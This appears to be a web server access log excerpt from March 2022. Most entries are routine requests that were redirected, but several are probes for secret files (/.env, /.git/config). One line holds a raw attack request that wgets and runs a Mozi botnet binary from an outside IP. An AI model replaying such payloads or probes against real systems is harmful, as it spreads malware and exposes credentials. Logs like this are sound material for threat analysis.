+[2022-03-07T11:20:14.959Z] "GET / HTTP/1.1" 301 - 0 0 0 - 15.204.129.209 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" ? ?:80 -
+[2022-03-07T11:23:21.048Z] "GET / HTTP/1.1" 301 - 0 0 0 - 31.58.240.5 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP? -
+[2022-03-07T12:46:43.403Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 37.120.148.140 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-07T12:46:44.212Z] "POST / HTTP/1.1" 301 - 0 0 0 - 37.120.148.138 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-07T13:20:22.999Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 103.141.138.116 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-07T13:20:23.683Z] "POST / HTTP/1.1" 301 - 0 0 0 - 103.141.138.116 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-07T15:02:44.668Z] "GET / HTTP/1.1" 301 - 0 0 0 - 36.74.42.148 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-07T15:05:09.042Z] "GET / HTTP/1.1" 301 - 0 0 0 - 46.98.197.102 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" ? ?:80 -
+[2022-03-07T15:08:11.445Z] "GET / HTTP/1.1" 301 - 0 0 0 - 139.162.215.70 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" ? ?IP? -
+[2022-03-07T15:08:12.479Z] "GET /zabbix/ HTTP/1.1" 301 - 0 0 0 - 139.162.215.70 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" ? ?IP? -
+[2022-03-07T16:06:25.738Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://103.41.36.41:49354/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 - 0 0 0 - 103.41.36.41 "Hello, world" ? ?:80 -
+[2022-03-07T16:15:42.440Z] "GET / HTTP/1.1" 301 - 0 0 0 - 213.175.185.178 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:80 -
+[2022-03-07T16:59:23.615Z] "GET / HTTP/1.1" 301 - 0 0 0 - 15.204.130.187 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" ? ?:80 -
+[2022-03-07T17:26:14.034Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 44.200.253.131 python-requests/2.22.0 ? ?IP? -
+[2022-03-07T17:28:41.789Z] "GET / HTTP/1.1" 301 - 0 0 0 - 80.91.206.71 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-07T18:23:45.450Z] "GET / HTTP/1.0" 426 - 0 0 0 - --14.226.209.150++ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" - ?IP? -
